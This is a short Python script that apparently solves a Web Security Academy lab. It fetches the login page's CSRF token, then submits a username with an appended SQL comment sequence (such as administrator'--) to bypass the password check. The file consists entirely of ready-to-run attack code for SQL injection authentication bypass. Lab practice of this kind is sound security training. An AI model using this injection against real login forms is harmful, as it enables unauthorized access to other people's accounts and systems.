# usage:
# python3 2.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net
# --w administrator

import re
from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, who: str) -> None:
        self.url = url.rstrip("/")
        self.who = who
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        self.login(self.who + "'--", "password")


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    args = parser.parse_args()
    s = Solution(args.url, args.who)
    s.solve()


if __name__ == "__main__":
    main()
